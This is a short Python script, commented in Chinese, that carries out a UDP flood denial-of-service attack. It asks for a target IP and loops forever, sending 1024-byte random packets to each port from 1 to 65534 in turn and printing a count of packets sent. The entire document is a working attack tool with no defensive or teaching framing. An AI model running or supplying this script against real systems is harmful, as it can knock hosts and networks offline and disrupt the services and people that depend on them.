from socket import *
import random

# 创建 socket 关键字
st = socket(AF_INET, SOCK_DGRAM)
# 创建随机报文数据
bytes = random._urandom(1024)

ip = input("IP Target :")
port = 1
sent = 0

print("UDP flood attack is about to begin...")

while True:
    # 发送数据
    st.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
    if port == 65534:
        port = 1